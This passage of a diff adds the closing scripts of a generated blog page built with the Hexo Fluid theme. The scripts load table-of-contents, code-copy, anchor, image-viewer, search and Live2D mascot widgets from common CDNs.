+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
